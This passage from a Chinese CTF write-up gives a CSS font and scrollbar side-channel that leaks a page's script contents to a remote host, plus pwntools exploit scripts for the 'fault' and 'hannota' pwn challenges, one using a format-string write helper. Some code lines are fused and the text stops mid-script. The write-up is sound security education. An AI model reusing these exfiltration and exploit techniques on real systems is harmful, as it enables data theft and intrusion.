        css += `body{overflow-y:hidden;overflow-x:auto;white-space:nowrap;display:block}html{display:block}*{display:none}body::-webkit-scrollbar{display:block;background: blue url(http://xxxx:23459/?${encodeURIComponent(prefix+c)})}`
        css += `@font-face{font-family:a${c.charCodeAt()};src:url(http://xxxxx:23460/font/${prefix}/${c});}`
        css += `script{font-family:a${c.charCodeAt()};display:block}`
        document.write('')
    })
原理：
  1. 将页面宽度设置为100000px，保证不会出现滚动条；
  2. 隐藏页面内所有元素，然后将script标签显示出来；
  3. 为script标签设置字体，如果匹配到了对应字符，则显示滚动条；
  4. 通过滚动条接收当前字符。
把这个页面的URL直接交给bot，即可接收到一位的flag。之后逐位爆破即可。效果如图：
# pwn
## fault
感谢 **r3kapig** 的大佬们带来的精彩比赛
看了流量才找到洞。。
加密函数：
    add_round_key((__int64)v15, v9, 0);
      for ( k = 1; k ",timeout=0.5)
        p.sendline(command)
    def main(host,port=9999):
        global p
        if host:
            p = remote(host,port)
        else:
            p = process("./origin_fault")
            gdb.attach(p)
            # debug(0x0000000000003004)
        cmd('e')
        p.sendline("00"*0x10)
        cmd('e')
        p.sendline("cafebabedeadbeefcafebabedeadbeef".decode('hex'))
        cmd('d')
        payload1 = "5658a9ced4f5415d3e85e2e879d464405658a9ced4f5415d3e85e2e879d46440"
        payload2 = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
        p.sendline(payload1)
        p.sendline(payload2)
        cmd('e')
        p.sendline("cafebabedeadbeefcafebabedeadbeef".decode('hex'))
        p.recvuntil("e:encryp",drop=True)
        p.recvuntil(">")
        key = p.recvuntil("e:encryp",drop=True)
        info(key)
        cmd('s')
        p.sendline(key)
        flag = p.recv(0x3c,timeout=0.5)
        info(flag)
        p.interactive()
    if __name__ == "__main__":
        main(args['REMOTE'])
## hannota
第二天说没有流量了。。。。。其实内心是有点慌的
只找到了两个漏洞
一个是`login`函数的堆溢出
    v14 = __readfsqword(0x28u);
      src = 0LL;
      printf("please enter user token length : ");
      size = get_int();
      if ( size >> ",timeout=0.5)
        p.sendline(str(command))
    def fmtstr(offset, addr, data, written):
        cnt = 0
        payload = ''
        address = ''
        for x in data:
            cur = ord(x)
            if cur >= written&0xff:
                to_add = cur - (written&0xff)
            else:
                to_add = 0x100 + cur - (written&0xff)
            round = ''
            if to_add != 0:
                round += "%{}c".format(to_add)
            round += "%{}$hhn".format(offset+cnt+len(data)*2)
            assert(len(round) <= 0x10)
            written += to_add + 0x10 - len(round)
            payload += round.ljust(0x10, '_')
            address += p64(addr+cnt)
            cnt+=1
        return payload + address
    def ca(tl,t,nl,n,pl,pa):
        cmd(1)
        p.recvuntil("please enter user token length : ")
        p.sendline(str(tl))
        p.recvuntil("please enter user token: ")
        p.sendline(t)
        p.recvuntil("please enter user name length : ")
        p.sendline(str(nl))
        p.recvuntil("please enter user name: ")
        p.sendline(n)
        p.recvuntil("please enter user password length : ")
        p.sendline(str(pl))
        p.recvuntil("please enter user password: ")
        p.sendline(pa)
    def login(tl,t,pl,pa):
        cmd(0)
        p.recvuntil("please enter user token length : ")
        p.sendline(str(tl))